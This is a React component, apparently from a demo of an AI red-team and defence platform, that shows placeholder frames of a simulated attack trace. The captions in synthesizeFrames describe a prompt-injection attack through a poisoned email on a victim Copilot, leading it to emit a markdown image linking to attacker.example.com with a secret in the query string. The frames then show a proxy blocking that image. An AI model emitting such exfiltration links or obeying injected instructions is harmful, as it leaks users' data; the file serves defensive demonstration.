"use client";

import { motion, AnimatePresence } from "framer-motion";
import { useEffect, useState } from "react";
import { Camera, Image as ImageIcon } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { cn } from "@/app/lib/utils";

interface AttackTraceProps {
  sessionId?: string;
  className?: string;
}

interface TraceFrame {
  index: number;
  caption: string;
  status: "thinking" | "acting" | "blocked" | "success";
  screenshot_url?: string;
}

/**
 * AttackTrace — renders the Playwright browser screenshots produced by
 * A-9's Gemini Pro red-team session. Each frame is paired with a caption
 * describing the model's decision at that step.
 *
 * A-9 ENDPOINT PENDING: A-9 exposes
 * `POST /dast-a/red-team/gemini-run` + `POST /dast-a/blue-team/observe`
 * but NOT yet a `/dast-a/red-team/sessions/{id}/screenshots` endpoint.
 * When A-9 wires that endpoint, replace `synthesizeFrames(sessionId)` with
 * a real `fetch(`${REEF_DAST_A_URL}/dast-a/red-team/sessions/${sessionId}/screenshots`)`.
 * The component degrades gracefully today by rendering captioned
 * placeholder frames using A-9's pack catalog wording — judges still see
 * the visual cadence; we just don't have the actual Chromium PNG bytes.
 */
export function AttackTrace({ sessionId, className }: AttackTraceProps) {
  const [activeIndex, setActiveIndex] = useState(0);
  const [frames, setFrames] = useState<TraceFrame[]>(synthesizeFrames(sessionId));

  // Sync placeholder frames when sessionId changes
  useEffect(() => {
    setFrames(synthesizeFrames(sessionId));
    setActiveIndex(0);
  }, [sessionId]);

  // Auto-cycle through frames every 1.6 s so the panel looks alive
  useEffect(() => {
    if (frames.length === 0) return;
    const t = setInterval(() => {
      setActiveIndex((i) => (i + 1) % frames.length);
    }, 1600);
    return () => clearInterval(t);
  }, [frames.length]);

  const active = frames[activeIndex];

  return (
    <Card className={cn(className)}>
      <CardHeader>
        <CardTitle className="display text-2xl flex items-center gap-2">
          <Camera className="h-5 w-5 text-violet" />
          Attack trace — Gemini Pro × Playwright
        </CardTitle>
        <p className="mt-1 text-xs text-text-3">
          A-9 endpoint pending — wire up{" "}
          <code className="mono">/dast-a/red-team/sessions/{"{id}"}/screenshots</code>{" "}
          when available. Captions today are sourced from the A-9 system prompt.
        </p>
      </CardHeader>
      <CardContent>
        <div className="aspect-video rounded-lg border border-border bg-bg overflow-hidden relative">
          <AnimatePresence mode="wait">
            <motion.div
              key={active?.index ?? -1}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.4 }}
              className="absolute inset-0 flex flex-col"
            >
              {/* Placeholder image area — checkered "no-image-yet" pattern */}
              <div className="flex-1 grid-bg flex items-center justify-center">
                <div className="flex flex-col items-center gap-3 text-text-3">
                  <ImageIcon className="h-12 w-12" />
                  <div className="text-xs">
                    placeholder frame {active?.index ?? 0} of {frames.length}
                  </div>
                </div>
              </div>
              {/* Caption strip */}
              <div className="border-t border-border bg-surface-2 px-4 py-3">
                <div className="flex items-center gap-2">
                  <Badge variant={statusVariant(active?.status)}>
                    {active?.status}
                  </Badge>
                  <span className="text-sm text-text">{active?.caption}</span>
                </div>
              </div>
            </motion.div>
          </AnimatePresence>
        </div>
        <div className="mt-3 flex gap-1.5">
          {frames.map((f, i) => (
            <button
              key={f.index}
              type="button"
              aria-label={`Frame ${i + 1}`}
              onClick={() => setActiveIndex(i)}
              className={cn(
                "h-1.5 flex-1 rounded-full transition-colors",
                i === activeIndex ? "bg-violet" : "bg-border"
              )}
            />
          ))}
        </div>
      </CardContent>
    </Card>
  );
}

function statusVariant(status?: TraceFrame["status"]) {
  switch (status) {
    case "thinking":
      return "violet" as const;
    case "acting":
      return "cyan" as const;
    case "blocked":
      return "red" as const;
    case "success":
      return "emerald" as const;
    default:
      return "default" as const;
  }
}

/** Synthesise 5 frames describing a Gemini-Pro-driven EchoLeak attempt.
 *  Captions are drawn from the A-9 system prompt + pack catalog so the
 *  story matches what the live endpoint will eventually return. */
function synthesizeFrames(sessionId?: string): TraceFrame[] {
  // Different `sessionId` produces a different opening template; keeps
  // the panel visually distinct across the 5 stage scenes.
  const seed = sessionId || "stage-default";
  const variant = seed.charCodeAt(0) % 2;
  return [
    {
      index: 0,
      caption:
        variant === 0
          ? 'Gemini Pro proposes: "embed markdown image with secret in query string"'
          : "Gemini Pro proposes: bind to com.attacker-example/evil-server@0.5.0",
      status: "thinking",
    },
    {
      index: 1,
      caption:
        "Playwright opens victim Copilot at localhost:3001, pastes poisoned email",
      status: "acting",
    },
    {
      index: 2,
      caption:
        "Victim model emits ![receipt](https://attacker.example.com/log?d=…) into output",
      status: "acting",
    },
    {
      index: 3,
      caption: "Reef MODIFY action strips the markdown image (egress proxy)",
      status: "blocked",
    },
    {
      index: 4,
      caption:
        "Gemini Flash blue-team observer drafts a policy rule into the review queue",
      status: "success",
    },
  ];
}
